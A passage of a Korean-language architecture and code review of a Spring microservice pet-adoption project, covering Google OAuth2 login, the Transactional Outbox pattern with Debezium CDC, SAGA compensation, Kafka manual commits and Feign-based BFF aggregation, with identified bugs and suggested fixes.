③ 사용자 동의 → 구글이 code를 붙여 되돌려보냄
     → GET /login/oauth2/code/google?code=...
④ Spring Security가 code를 access token으로 교환하고 사용자 정보를 가져옴
⑤ CustomOAuth2UserService.loadUser()   ← 우리 코드
     구글 정보로 DB 조회/생성 → PrincipalDetails 반환
⑥ OAuth2SuccessHandler                  ← 우리 코드
     JWT 발급 → Refresh Token DB 저장 → 쿠키 설정 → 프론트로 리다이렉트
```

**③④가 왜 중요한가** — Authorization Code Grant 방식입니다. 구글이 토큰을 **브라우저에 직접 주지 않고**
1회용 `code`만 줍니다. 서버가 그 code와 client-secret으로 토큰을 교환합니다.
브라우저(=사용자, 확장 프로그램, 로그)에 토큰이 노출되지 않습니다.
이 절차 전체를 Spring Security가 처리하므로 우리 코드는 ⑤⑥ 두 지점만 채웁니다.

### `OAuth2UserInfo` 인터페이스 — 지금은 구글 하나뿐인데 왜 추상화했나

[oauth2/dto/GoogleOAuth2UserInfo.java](../user-service/src/main/java/com/pawbridge/userservice/oauth2/dto/GoogleOAuth2UserInfo.java)

```java
public class GoogleOAuth2UserInfo implements OAuth2UserInfo {
    @Override public String getProviderId() { return (String) attributes.get("sub"); }
    @Override public String getEmail()      { return (String) attributes.get("email"); }
    @Override public String getName()       { return (String) attributes.get("name"); }
    @Override public String getProvider()   { return "GOOGLE"; }
}
```

제공자마다 응답 JSON의 **키 이름이 다릅니다.**

```
Google  { "sub": "...",  "email": "...", "name": "..." }
Kakao   { "id": 123,     "kakao_account": { "email": "...", "profile": { "nickname": "..." } } }
Naver   { "response": { "id": "...", "email": "...", "name": "..." } }
```

인터페이스로 감싸두면 카카오를 추가할 때 `KakaoOAuth2UserInfo` 클래스 하나만 만들면 되고,
`CustomOAuth2UserService`의 나머지 로직은 손대지 않습니다. **확장 지점을 미리 만들어 둔 좋은 예입니다.**

### 이메일 충돌 처리

```java
User user = userRepository.findByEmailAndProvider(email, "GOOGLE")
        .orElseGet(() -> {
            // LOCAL 계정 충돌 확인
            if (userRepository.findByEmailAndProvider(email, "LOCAL").isPresent()) {
                throw new OAuth2ProcessingException(
                        "이미 해당 이메일로 가입된 계정이 있습니다. 일반 로그인을 이용해주세요.");
            }
            ...새 사용자 생성
        });
```

같은 `a@gmail.com`으로 일반 회원가입도 하고 구글 로그인도 시도할 수 있습니다.
그래서 `User` 엔티티가 이렇게 되어 있습니다:

```java
@Table(name = "users",
    uniqueConstraints = {
        @UniqueConstraint(columnNames = {"email", "provider"}),   // ★ email 단독이 아니라 (email, provider)
        @UniqueConstraint(columnNames = {"nickname"})
    })
```

**`email` 단독 유니크가 아니라 `(email, provider)` 복합 유니크**입니다. 그래서 같은 이메일로
LOCAL 계정과 GOOGLE 계정이 **공존할 수 있습니다.**

그런데 공존하면 사용자가 혼란스럽습니다("가입했는데 로그인이 안 돼요"). 그래서 코드는
**"LOCAL이 이미 있으면 구글 가입을 막고 안내"** 하는 정책을 택했습니다. 명확한 선택입니다.

⚠️ 다만 **반대 방향이 비어 있습니다.** GOOGLE 계정이 먼저 있는 상태에서 같은 이메일로 일반 회원가입을
하면(`UserServiceImpl.signUp`은 `existsByEmailAndProvider(email, "LOCAL")`만 확인) **통과됩니다.**
같은 이메일의 두 계정이 만들어져 사용자가 혼란을 겪습니다.
회원가입 쪽에도 GOOGLE 계정 존재 확인을 넣어 대칭으로 만드는 게 좋습니다.

### 소셜 사용자의 비밀번호

```java
public static User createSocialUser(...) {
    return User.builder()
            .password("OAuth2")   // OAuth2 사용자는 비밀번호 불필요, 더미 값
            ...
}
```

`password` 컬럼이 `nullable = true`인데도 더미 문자열을 넣었습니다.
`"OAuth2"`는 BCrypt 해시 형식이 아니므로 `matches()`가 항상 false를 반환해 **일반 로그인으로는
절대 통과할 수 없습니다.** 안전하지만, `null`이 더 의도를 잘 드러냅니다.

비밀번호 변경도 막혀 있습니다:

```java
if (!user.isLocalUser()) throw new OAuthUserCannotChangePasswordException();
```

---

## 7. 역방향 리팩토링 — email-service를 왜 합쳤나

`email/` 패키지의 구조를 보면 원래 독립 서비스였던 흔적이 뚜렷합니다:

```
email/
├── config/RedisConfig.java       ← 자기 설정
├── controller/EmailController.java
├── dto/request, dto/response     ← 자기 DTO 계층
├── service/
└── util/CodeGenerator.java
```

**MSA에서 서비스를 합치는 건 "후퇴"처럼 보이지만, 판단 기준을 적용하면 합치는 게 맞습니다.**

| 판단 기준 | email-service의 경우 |
|---|---|
| 독립적으로 배포할 이유가 있나? | ❌ 회원가입과 항상 함께 변경됨 |
| 독립적으로 확장(스케일)할 이유가 있나? | ❌ 트래픽이 회원가입에 비례 |
| 별도의 데이터를 소유하나? | ❌ Redis 키 몇 개뿐, DB 없음 |
| 다른 팀이 소유하나? | ❌ 같은 사람이 개발 |
| 나눠서 생기는 비용은? | ⭕ 네트워크 홉 1개, 배포 대상 1개, 장애점 1개 추가 |

회원가입은 **"이메일 인증 여부 확인 → 사용자 저장"** 이 한 흐름입니다. 나뉘어 있으면
`isVerified()` 하나 확인하려고 HTTP 호출을 하고, 그 호출이 실패하면 회원가입 전체가 실패합니다.
합치면 메서드 호출이라 실패 지점이 사라집니다.

> 📌 **"마이크로서비스는 작을수록 좋다"는 오해입니다.** 기준은 크기가 아니라
> **"함께 변경되는 것은 함께 두고, 따로 변경되는 것은 나눈다"** 입니다.
> 이걸 이론으로 설명하는 것과, 실제로 합쳐보고 근거를 말하는 것은 다릅니다.

⚠️ 다만 합친 뒤 남은 문제가 있습니다. `EmailController`가 게이트웨이에서 **JWT 필터 없이** 열려 있습니다
(회원가입 전이라 토큰이 없으니 당연). 방어는 Redis 횟수 제한 하나이고, 그 **키는 이메일 주소 기준**입니다.

```java
String sendCountKey = "email:send:count:" + email;   // 이메일별 5회/5분
```

공격자가 이메일을 계속 바꾸면 제한을 우회해 **SMTP를 무제한으로 소모**할 수 있습니다.
Gmail SMTP는 일일 발송 한도가 있어서, 채우면 정상 사용자도 인증 메일을 못 받습니다.
**IP 기준 제한을 함께 걸어야 합니다** (`email:send:ip:{ip}` 키 추가, 같은 Lua 스크립트 재사용).

---

## 8. ★ 찜(Favorite) 기능 — Outbox + CDC + SAGA

이 프로젝트에서 기술적으로 가장 공들인 부분입니다. 천천히 봅니다.

### 8-1. 문제 상황: 두 서비스의 데이터를 함께 바꿔야 한다

```
사용자가 3번 동물을 찜하면:
  user-service   favorites 테이블에 (userId=1, animalId=3) INSERT
  animal-service animals 테이블의 3번 행 favorite_count += 1
```

**두 개의 다른 DB입니다.** 모놀리스라면 하나의 트랜잭션으로 묶으면 끝이지만, MSA에서는 불가능합니다.

### 8-2. 순진한 방법과 그 함정 (Dual Write)

```java
// ❌ 이렇게 하면 안 되는 코드
@Transactional
public void addFavorite(Long userId, Long animalId) {
    favoriteRepository.save(favorite);                    // ① DB 저장
    kafkaTemplate.send("favorite.added", event);          // ② Kafka 발행
}
```

**"하나의 트랜잭션 안에서 DB와 Kafka에 각각 쓰기" = Dual Write 문제**입니다. 실패 조합을 보면:

| 상황 | 결과 |
|---|---|
| ①성공 ②성공 | ✅ 정상 |
| ①실패 | ✅ 정상 (롤백, 이벤트도 안 나감) |
| ①성공 ②실패 (Kafka 장애) | 💀 **찜은 됐는데 카운트가 안 올라감** |
| ②성공 후 트랜잭션 커밋 실패 | 💀 **찜은 없는데 카운트가 올라감 (유령 이벤트)** |

Kafka는 트랜잭션에 참여하지 않으므로 `@Transactional`이 롤백해도 **이미 나간 메시지는 되돌릴 수
없습니다.** 게다가 이 오류는 평소엔 안 보이고 장애 순간에만 터져서 발견이 늦습니다.

### 8-3. 해법: Transactional Outbox 패턴

**핵심 아이디어**: "DB와 Kafka에 각각 쓰기"를 **"DB에만 두 번 쓰기"** 로 바꿉니다.

```java
@Transactional                       // 하나의 트랜잭션
public FavoriteResponseDto addFavorite(Long userId, Long animalId) {
    favoriteRepository.save(favorite);                 // ① 비즈니스 데이터
    outboxService.saveEvent(..., eventPayload);        // ② 같은 DB의 outbox_events 테이블
}
```

**같은 DB의 같은 트랜잭션**이므로 둘은 반드시 함께 성공하거나 함께 롤백됩니다.
DB가 원자성을 보장해 줍니다. 이제 "찜은 있는데 이벤트가 없는" 상태가 **구조적으로 불가능**합니다.

그럼 이 `outbox_events` 행은 누가 Kafka로 옮기나? → **Debezium이 MySQL의 binlog를 읽습니다.**

```
[user-service]                                    [animal-service]
    │ @Transactional
    ├─ INSERT favorites
    └─ INSERT outbox_events
            │
            │ MySQL이 binlog(변경 기록)에 남김
            ▼
    [Debezium MySQL Connector]  ← binlog를 실시간으로 읽음
            │
            │ EventRouter SMT로 변환 (payload만 꺼내고 토픽 결정)
            ▼
    [Kafka: user.favorite.events]
            │
            └──────────────────────────────────────► Consumer
                                                      favorite_count += 1
```

**binlog(Binary Log)란**: MySQL이 모든 데이터 변경을 순서대로 기록하는 로그입니다.
원래는 복제(replication)와 복구용인데, Debezium은 이걸 "변경 이벤트 스트림"으로 활용합니다.
이 방식을 **CDC(Change Data Capture, 변경 데이터 캡처)** 라고 합니다.

**애플리케이션 입장에서 얻는 것**: 코드에 Kafka가 등장하지 않습니다.
`outbox_events` 테이블에 INSERT만 하면 됩니다. Kafka가 잠시 죽어 있어도 서비스는 정상 동작하고,
Debezium이 살아나면 binlog의 밀린 지점부터 이어서 읽습니다. **자연스럽게 재시도가 됩니다.**

### 8-4. Outbox 테이블 설계 정독

[entity/OutboxEvent.java](../user-service/src/main/java/com/pawbridge/userservice/entity/OutboxEvent.java)

```java
@Table(name = "outbox_events",
        uniqueConstraints = { @UniqueConstraint(name="uk_event_id", columnNames={"event_id"}) },
        indexes = { @Index(name="idx_created_at", columnList="created_at") })
public class OutboxEvent {
    private Long   outboxEventId;   // PK (auto increment)
    private String eventId;         // UUID — 소비자 멱등성용
    private String aggregateType;   // "Favorite" — 어떤 종류의 것에 대한 이벤트인가
    private String aggregateId;     // "1"       — 그중 어느 것인가 (Kafka 파티션 키)
    private String eventType;       // "FAVORITE_ADDED"
    private String topic;           // "user.favorite.events"
    private String payload;         // JSON 본문 (columnDefinition = "JSON")
    private LocalDateTime createdAt;
}
```

각 컬럼이 왜 필요한지:

- **`eventId` (UUID + 유니크)** — Kafka는 "최소 한 번(at-least-once)" 전달이라 **같은 메시지가 두 번
  올 수 있습니다.** 소비자가 "이 eventId 처리했나?"를 확인해 중복을 걸러냅니다. 이게 없으면
  찜 한 번에 카운트가 2 올라갑니다.
- **`aggregateType`** — Debezium 커넥터 설정의 `transforms.outbox.route.by.field: aggregate_type`이
  이 값으로 **목적지 토픽을 결정**합니다. 한 테이블에서 여러 종류의 이벤트를 다른 토픽으로 보낼 수 있습니다.
- **`aggregateId`** — `table.field.event.key`로 지정되어 **Kafka 메시지 키**가 됩니다.
  같은 키는 같은 파티션으로 가고, **한 파티션 안에서는 순서가 보장**됩니다. 순서 보장의 핵심입니다.
- **`payload` (JSON 타입)** — 커넥터의 `table.expand.json.payload: true`가 이 JSON 문자열을
  **객체로 펼쳐서** Kafka에 보냅니다. 이게 없으면 소비자가 문자열을 한 번 더 파싱해야 합니다.
- **`created_at` 인덱스** — 정리 스케줄러가 `deleteByCreatedAtBefore(7일 전)`로 지울 때 씁니다.
  인덱스가 없으면 전체 스캔이 됩니다.

### 8-5. 🚨 여기에 결함이 있습니다 — `REQUIRES_NEW`가 원자성을 깬다

[service/OutboxServiceImpl.java](../user-service/src/main/java/com/pawbridge/userservice/service/OutboxServiceImpl.java)

```java
@Override
@Transactional(propagation = Propagation.REQUIRES_NEW)   // ← 🚨 문제
public void saveEvent(String aggregateType, ...) {
```

**Outbox 패턴이 성립하는 이유는 오직 하나입니다: 비즈니스 변경과 이벤트 INSERT가 같은 트랜잭션이라는 것.**
`REQUIRES_NEW`는 그것을 **별도의 트랜잭션으로 떼어냅니다.**

트랜잭션 전파(propagation) 옵션의 차이:

```
REQUIRED (기본값)                      REQUIRES_NEW
┌─ 부모 트랜잭션 ────────────┐        ┌─ 부모 트랜잭션 ──────────┐
│  INSERT favorites          │        │  INSERT favorites        │
│  ┌ 같은 트랜잭션에 합류 ─┐  │        │  ┌─ 새 트랜잭션 ───────┐ │
│  │ INSERT outbox_events │  │        │  │ INSERT outbox_events│ │
│  └──────────────────────┘  │        │  │ → 즉시 COMMIT ★    │ │
│  → 함께 COMMIT / 함께 ROLLBACK      │  └─────────────────────┘ │
└────────────────────────────┘        │  ...이후 실패하면?       │
                                       │  → favorites만 ROLLBACK  │
                                       └──────────────────────────┘
```

**실제로 벌어질 수 있는 일** — [FavoriteServiceImpl.addFavorite()](../user-service/src/main/java/com/pawbridge/userservice/service/FavoriteServiceImpl.java)을 보면:

```java
@Transactional
public FavoriteResponseDto addFavorite(Long userId, Long animalId) {
    ...
    Favorite saved = favoriteRepository.save(favorite);
    outboxService.saveEvent(...);                      // ← 여기서 별도 커밋됨
    return FavoriteResponseDto.fromEntity(saved);      // ← 이 뒤에 실패하면?
}
```

`saveEvent` 이후에 무엇이든 실패하면(DTO 변환 오류, DB 커밋 실패, 커넥션 끊김, 낙관적 락 충돌…)
**찜은 롤백되고 이벤트만 살아남습니다.** Debezium이 그 이벤트를 읽어 animal-service의
`favorite_count`를 +1 하고, **정작 찜 목록에는 아무것도 없습니다.**

즉 **막으려던 Dual Write 문제가 방향만 바뀌어 되돌아왔습니다.**

**다른 서비스는 올바르게 되어 있습니다** — 이 점이 진단의 핵심 근거입니다.

| 서비스 | 파일 | 전파 설정 | 판정 |
|---|---|---|---|
| user-service | `service/OutboxServiceImpl.java:29` | `REQUIRES_NEW` | ❌ |
| animal-service | `service/OutboxService.java:40` | `@Transactional` (기본) | ✅ |
| community-service | `service/OutboxServiceImpl.java:37` | `@Transactional` (기본) | ✅ |

같은 패턴을 세 서비스가 각자 구현했고 그중 하나가 틀렸습니다.
**공유 모듈이 없어 복붙으로 퍼진 결과**입니다.

**고치는 방법**: `propagation` 속성을 지우면 됩니다.

```java
@Transactional   // 부모 트랜잭션에 합류 (REQUIRED가 기본값)
public void saveEvent(...) { ... }
```

`REQUIRES_NEW`를 쓴 의도는 아마 "이벤트 저장이 실패해도 찜은 성공시키자"였을 것입니다.
하지만 **그건 Outbox 패턴이 막으려는 바로 그 상황입니다.** 이벤트 저장이 실패하면 찜도 실패해야 맞습니다.
같은 DB의 같은 테이블 INSERT라 실패 확률도 낮습니다.

**검증 방법 (테스트로 잡을 수 있습니다)**

```java
@Test
void 찜_트랜잭션이_롤백되면_outbox에도_남지_않는다() {
    assertThrows(RuntimeException.class, () -> favoriteService.찜하고_강제로_실패());
    assertThat(outboxEventRepository.count()).isZero();   // 현재 코드는 여기서 실패한다
}
```

### 8-6. 같은 파일의 작은 문제 — ObjectMapper를 매번 새로 만든다

```java
public class OutboxServiceImpl implements OutboxService {
    private final ObjectMapper objectMapper;     // ← 주입받았는데
    ...
    public void saveEvent(...) {
        ObjectMapper mapper = new ObjectMapper();          // ← 안 쓰고 새로 만든다
        mapper.registerModule(new JavaTimeModule());
        mapper.configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS, false);
        String payloadJson = mapper.writeValueAsString(payload);
```

`ObjectMapper` 생성은 가볍지 않습니다(내부 캐시·리플렉션 정보를 구축). 찜 한 번에 하나씩 만들고 버립니다.
`JavaTimeModule`을 등록하려고 새로 만든 것으로 보이는데, **Spring Boot가 주입해 주는 `ObjectMapper`에는
`JavaTimeModule`이 이미 등록되어 있습니다**(`jackson-datatype-jsr310`이 의존성에 있고 자동 구성됨).

```java
// 이렇게 하면 된다
String payloadJson = objectMapper.writeValueAsString(payload);
```

`WRITE_DATES_AS_TIMESTAMPS: false`도 Spring Boot 기본값이 이미 `false`입니다.

### 8-7. `Map.of()`로 이벤트 페이로드를 만드는 부분

```java
Map<String, Object> eventPayload = Map.of(
        "eventType", "FAVORITE_ADDED",
        "eventId", eventId,
        "userId", userId,
        "animalId", animalId,
        "timestamp", LocalDateTime.now().toString()
);
```

⚠️ **`Map.of()`의 두 가지 함정**:

1. **null을 넣으면 즉시 `NullPointerException`**입니다. 지금은 모든 값이 non-null이라 괜찮지만,
   나중에 nullable 필드를 추가하면 터집니다.
2. **키 이름이 문자열이라 컴파일러가 검사하지 못합니다.** 소비자 쪽
   [FavoriteEventConsumer](../animal-service/src/main/java/com/pawbridge/animalservice/consumer/FavoriteEventConsumer.java)는
   `payload.get("animalId")`로 읽는데, 여기서 `"animalld"`(L이 아니라 l)처럼 오타를 내도
   **빌드는 통과하고 런타임에 NPE**가 납니다.

`event/` 패키지에 이미 `FavoriteAddedEvent`, `FavoriteRemovedEvent` 클래스가 **있는데도** `Map`을 쓰고
있습니다. 그 클래스를 쓰면 컴파일러가 필드 이름을 검사해 줍니다.

### 8-8. SAGA 보상 트랜잭션 — 되돌릴 수 없는 것을 되돌리는 방법

Outbox로 "이벤트는 반드시 나간다"를 보장했습니다. 그런데 **받는 쪽이 실패하면** 어떻게 하나?

```
찜 INSERT 성공 → 이벤트 발행 → animal-service가 카운트 증가 실패 (3번 재시도 후 포기)
                                  ↓
                      user-service의 찜만 남는다 (불일치)
```

DB 트랜잭션은 이미 커밋되어 롤백할 수 없습니다. 그래서 **"반대 작업을 실행"** 합니다.
이것이 **SAGA 패턴의 보상 트랜잭션(compensating transaction)** 입니다.

```
정방향:  찜 추가  →  카운트 +1
                        ↓ 실패
보상:    찜 삭제  ←  보상 이벤트 발행 (user.compensation.events)
```

[consumer/CompensationEventConsumer.java](../user-service/src/main/java/com/pawbridge/userservice/consumer/CompensationEventConsumer.java) →
[handler/CompensationEventHandler.java](../user-service/src/main/java/com/pawbridge/userservice/handler/CompensationEventHandler.java)

```java
@Transactional
public void rollbackFavoriteAdded(FavoriteCompensationEvent event) {
    // 1. 이미 처리한 이벤트인가?
    if (processedEventRepository.existsByEventId(eventId)) {
        log.warn("[COMPENSATION] Duplicate event skipped: eventId={}", eventId);
        return;
    }
    // 2. ProcessedEvent 먼저 저장 (Race condition 방지)
    try {
        processedEventRepository.save(ProcessedEvent.of(eventId, "ROLLBACK_FAVORITE_ADDED"));
    } catch (Exception e) {
        return;
    }
    // 3. 실제 보상: 찜 삭제
    int deletedCount = favoriteRepository.deleteByUserUserIdAndAnimalId(userId, animalId);
}
```

**"먼저 기록하고 나중에 처리"의 이유** — 두 소비자가 같은 이벤트를 동시에 받으면
1번 검사를 둘 다 통과할 수 있습니다. `ProcessedEvent`를 먼저 INSERT하면 PK 충돌로 하나가 걸러집니다.
그리고 **같은 트랜잭션 안**이므로 "기록만 되고 처리가 안 되는" 일이 없습니다. 발상은 정확합니다.

⚠️ **그런데 2번의 try-catch가 실제로는 동작하지 않습니다.** JPA를 이해해야 보이는 문제입니다.

```java
processedEventRepository.save(...);   // 이 시점에 SQL이 나가지 않는다!
```

JPA는 **쓰기 지연(write-behind)** 을 합니다. `save()`는 엔티티를 영속성 컨텍스트에 넣을 뿐이고,
실제 `INSERT`는 **flush 시점(보통 트랜잭션 커밋 직전)** 에 나갑니다.
따라서 PK 충돌 예외는 `save()` 줄에서가 아니라 **트랜잭션이 끝날 때** 발생하고,
`try-catch`는 이미 지나가 있습니다. 결국 중복은 잡히지 않고 예외가 호출자로 전파됩니다.

게다가 `ProcessedEvent`는 `@Id`가 직접 할당한 String(`eventId`)이고 `@GeneratedValue`가 없어서,
Spring Data JPA의 `save()`는 `isNew()`를 false로 판단해 `merge()`를 호출합니다. `merge`는 먼저 SELECT를
하므로 상황이 조금 더 복잡해집니다.

**고치는 방법 세 가지:**

```java
// (A) 즉시 flush해서 예외를 그 자리에서 받는다
processedEventRepository.saveAndFlush(ProcessedEvent.of(...));

// (B) merge가 아니라 persist를 강제한다 (Persistable 구현)
public class ProcessedEvent implements Persistable<String> {
    @Transient private boolean isNew = true;
    @Override public boolean isNew() { return isNew; }
    @PostPersist @PostLoad void markNotNew() { this.isNew = false; }
}

// (C) 애초에 예외에 의존하지 않는다 — DB에 판단을 맡긴다
// INSERT ... ON DUPLICATE KEY UPDATE / INSERT IGNORE 를 native query로
```

가장 간단한 건 (A)입니다. 한 단어(`saveAndFlush`)로 의도한 동작이 됩니다.

> 💡 **여기서 배울 것**: "예외를 잡아서 중복을 처리한다"는 패턴은 **예외가 그 자리에서 발생할 때만**
> 유효합니다. JPA는 SQL을 미뤄 보내므로 이 가정이 깨집니다. ORM을 쓸 때 반복적으로 나타나는 함정입니다.

### 8-9. 보상 이벤트 소비자의 또 다른 문제 — 실패해도 ack

```java
} catch (Exception e) {
    log.error("[COMPENSATION] Failed to process compensation event: {}", e.getMessage());
    acknowledgment.acknowledge();      // ← 실패했는데도 커밋
}
```

주석에 *"실패 시 재시도하지 않고 로그만 남김 (데드레터 큐로 이동하도록 설정 가능)"* 이라고 솔직하게
적혀 있습니다. 즉 **보상에 실패하면 그대로 유실**됩니다.

이건 특히 아픕니다. **보상은 이미 무언가 잘못됐을 때 실행되는 마지막 방어선**입니다.
여기서 실패하면 데이터가 영구히 어긋난 채 아무도 모릅니다.

**최소한 이렇게는 해야 합니다.**

```java
} catch (Exception e) {
    log.error(...);
    throw new RuntimeException(e);   // ack하지 않음 → 재시도 → DLT로 이동
}
```

그리고 `DefaultErrorHandler` + `DeadLetterPublishingRecoverer`를 설정해
`user.compensation.events.DLT` 토픽으로 보내면, 실패한 보상을 나중에 사람이 확인하고 처리할 수 있습니다.
animal-service는 이미 이 방식을 쓰고 있으므로 [04-animal-service.md](04-animal-service.md)를 참고해
같은 설정을 옮기면 됩니다.

### 8-10. Kafka 소비자 설정 — 수동 커밋

[config/KafkaConsumerConfig.java](../user-service/src/main/java/com/pawbridge/userservice/config/KafkaConsumerConfig.java)

```java
config.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, false);          // ★ 자동 커밋 끔
factory.getContainerProperties().setAckMode(AckMode.MANUAL_IMMEDIATE); // 수동 즉시 커밋
```

**오프셋(offset)이란**: Kafka는 메시지를 지우지 않고 쌓아두며, 소비자는 "내가 어디까지 읽었다"는 위치를
기록합니다. 그게 오프셋입니다.

**자동 커밋이 위험한 이유**:

```
자동 커밋 (기본 5초 주기)
  메시지 수신 → (5초 경과, 오프셋 커밋됨) → 처리 중 서버 다운
  → 재시작하면 "이미 읽었다"고 판단해 그 메시지를 다시 안 준다 → 유실 💀

수동 커밋
  메시지 수신 → 처리 성공 → 그때 커밋
  → 처리 실패/다운 시 커밋 안 됨 → 재시작하면 다시 받는다 → 재시도 가능 ✅
```

`AckMode.MANUAL_IMMEDIATE`는 `ack.acknowledge()`를 호출하면 **즉시** 커밋합니다
(`MANUAL`은 배치 단위로 모아서 커밋).

`JsonDeserializer.TRUSTED_PACKAGES = "*"` 는 ⚠️ 주의할 설정입니다. JSON을 자바 객체로 역직렬화할 때
**어떤 클래스로든 만들 수 있게** 허용합니다. 신뢰할 수 없는 메시지가 들어오면 역직렬화 공격의 통로가
됩니다. 내부 Kafka라 위험이 낮지만, `"com.pawbridge.*"` 로 좁히는 편이 좋습니다.

### 8-11. 정리 스케줄러

[scheduler/OutboxCleanupScheduler.java](../user-service/src/main/java/com/pawbridge/userservice/scheduler/OutboxCleanupScheduler.java)

```java
@Scheduled(cron = "0 0 3 * * *")     // 매일 03:00 — outbox 7일 경과분 삭제
@Scheduled(cron = "0 30 3 * * *")    // 매일 03:30 — processed_events 30일 경과분 삭제
```

Outbox 테이블은 **계속 자라기만 합니다.** Debezium이 읽어 간 뒤에도 행이 남아 있으므로 정리가 필요합니다.

**보관 기간 차이의 이유**:
- `outbox_events` 7일 — Debezium이 이미 읽어갔으니 사실 바로 지워도 되지만, 장애 조사·재처리를 위해
  1주일 남깁니다.
- `processed_events` 30일 — 이건 **중복 판단의 근거**입니다. 지우면 그 뒤에 같은 eventId가 다시 오면
  중복을 못 걸러냅니다. 그래서 더 길게 둡니다.

**03:00과 03:30으로 나눈 이유**는 두 대량 삭제가 동시에 돌면 DB 부하가 겹치기 때문입니다.

⚠️ **주의 두 가지**:
1. **`@EnableScheduling`이 필요합니다.** 애플리케이션 클래스에 이 애노테이션이 없으면
   `@Scheduled`가 전혀 동작하지 않고 **에러도 안 납니다.** (조용히 실패하는 대표적 경우입니다.)
2. **인스턴스를 여러 대로 늘리면 스케줄러가 대수만큼 동시에 돕니다.** 지금은 삭제라 결과가 같아
   문제없지만, 이런 작업은 보통 분산 락(Redis/Redisson)이나 ShedLock으로 하나만 실행되게 합니다.
   store-service에 이미 Redisson이 있으니 참고할 수 있습니다.

---

## 9. 마이페이지 — BFF 패턴과 Feign

[service/MyPageServiceImpl.java](../user-service/src/main/java/com/pawbridge/userservice/service/MyPageServiceImpl.java)

### 문제: 마이페이지 한 화면에 3개 서비스 데이터가 필요하다

```
마이페이지
├── 내 정보          → user-service
├── 찜한 동물         → user-service(찜 목록) + animal-service(동물 상세)
├── 찜한 상품         → store-service
├── 주문 내역         → store-service
├── 장바구니          → store-service
└── 내가 등록한 동물   → animal-service
```

프론트가 6번 호출하면 왕복 지연이 6번 쌓이고, 프론트가 서비스 구조를 다 알아야 합니다.
→ **user-service가 대신 모아서 한 번에 내려줍니다.** 이것이 **BFF(Backend For Frontend)** 입니다.

### Feign — HTTP 호출을 인터페이스로 선언한다

[client/AnimalServiceClient.java](../user-service/src/main/java/com/pawbridge/userservice/client/AnimalServiceClient.java)

```java
@FeignClient(name = "animal-service")        // ← Eureka에 등록된 이름 (주소 아님!)
public interface AnimalServiceClient {
    @GetMapping("/api/v1/shelters/exists/{careRegNo}")
    Boolean existsByCareRegNo(@PathVariable("careRegNo") String careRegNo);

    @PostMapping("/api/v1/mypage/animals/batch")
    List<AnimalResponse> getAnimalsByIds(@RequestBody List<Long> animalIds);
}
```

**구현 클래스가 없습니다.** 인터페이스만 선언하면 Spring이 실행 시점에 구현체를 만들어 줍니다.
`RestTemplate`으로 쓰면 이렇게 됩니다:

```java
// Feign 없이 쓰면
String url = "http://animal-service/api/v1/shelters/exists/" + careRegNo;
ResponseEntity<Boolean> res = restTemplate.getForEntity(url, Boolean.class);
return res.getBody();
```

URL 문자열 조합, 인코딩, 응답 변환을 매번 손으로 씁니다. Feign은 **"컨트롤러를 쓰는 방식으로 클라이언트를
쓴다"** 는 발상입니다. 애노테이션이 컨트롤러와 거울처럼 대응합니다.

`name = "animal-service"`가 Eureka 이름이라는 점이 핵심입니다. IP를 모른 채 호출하고,
animal-service가 2대면 자동으로 로드밸런싱됩니다.

### N+1 네트워크 호출을 피한 설계

[FavoriteServiceImpl.getFavorites()](../user-service/src/main/java/com/pawbridge/userservice/service/FavoriteServiceImpl.java)

```java
// ❌ 이렇게 하면 안 된다
for (Favorite f : favorites) {
    AnimalResponse a = animalServiceClient.getAnimal(f.getAnimalId());   // 찜 30개 = 호출 30번
}

// ✅ 실제 코드
List<Long> animalIds = favorites.stream().map(Favorite::getAnimalId).toList();
List<AnimalResponse> animals = animalServiceClient.getAnimalsByIds(animalIds);   // 호출 1번

Map<Long, AnimalResponse> animalMap = animals.stream()
        .collect(Collectors.toMap(AnimalResponse::getId, Function.identity()));  // O(1) 조회용
```

**DB의 N+1 문제와 같은 구조지만 훨씬 비쌉니다.** DB 쿼리 30번은 수십 ms지만,
HTTP 호출 30번은 수백 ms~수 초입니다. 그래서 animal-service에 `POST /mypage/animals/batch`라는
**일괄 조회 전용 엔드포인트**를 만들었습니다.

`toMap`으로 Map을 만드는 것도 의도적입니다. 리스트에서 `filter`로 찾으면 O(n²)이 되므로
한 번 Map으로 바꿔 O(1) 조회를 합니다.

⚠️ `Collectors.toMap`은 **키가 중복되면 예외**를 던집니다. animal-service가 같은 id를 두 번 반환하는
일은 없어야 하지만, 방어적으로는 `toMap(..., (a,b) -> a)` 로 병합 규칙을 주는 게 안전합니다.

### 실패 처리 방식이 두 갈래로 갈려 있다

```java
// 찜 목록 (FavoriteServiceImpl) — 실패해도 목록은 반환
try {
    animals = animalServiceClient.getAnimalsByIds(animalIds);
} catch (Exception e) {
    log.error(...);
    // Circuit Breaker 패턴: 실패 시에도 찜 목록은 반환 (동물 정보 없이)
}
...
return animal != null ? FavoriteWithAnimalDto.of(favorite, animal)
                      : FavoriteWithAnimalDto.ofWithoutAnimal(favorite);   // 부분 응답
```

```java
// 마이페이지 (MyPageServiceImpl) — 실패하면 전체 실패
try {
    orders = storeServiceClient.getOrdersByUserId(...);
} catch (Exception e) {
    throw new RuntimeException("주문 내역을 조회할 수 없습니다.", e);
}
```

**전자가 더 나은 설계입니다.** 이걸 **Graceful Degradation(우아한 성능 저하)** 이라고 합니다.
animal-service가 죽었을 때 "찜 목록 전체를 못 본다"보다 "찜 목록은 보이고 동물 사진만 안 보인다"가
훨씬 낫습니다. `ofWithoutAnimal`이라는 별도 팩토리 메서드까지 만들어 대비했습니다.

⚠️ **다만 세 가지 개선점**:

1. **주석의 "Circuit Breaker 패턴"은 정확한 표현이 아닙니다.** 이 코드는 try-catch로 fallback을
   제공하는 것이고, Circuit Breaker는 **실패가 일정 비율을 넘으면 호출 자체를 차단**해 죽은 서비스를
   두드리지 않는 기법입니다. 실제로 쓰려면 Resilience4j 등이 필요합니다.
   (`build.gradle`에 관련 의존성이 없습니다.)
2. **마이페이지도 부분 응답으로 통일하는 게 좋습니다.** 지금은 store-service가 잠깐 흔들리면
   마이페이지 전체가 500입니다.
3. **`throw new RuntimeException(...)`은 500을 반환합니다.** 프로젝트에 잘 만들어진
   `ApplicationException` + `ErrorCode` 체계가 있는데 여기만 날 `RuntimeException`을 씁니다.
   `ErrorCode`에 `STORE_SERVICE_UNAVAILABLE(503, ...)`을 추가해 쓰면 프론트가 "일시적 오류"로
   구분할 수 있습니다. 이미 `SHELTER_SERVICE_UNAVAILABLE(503)`이라는 선례가 있습니다.

### 권한 검증이 여기에도 있다

```java
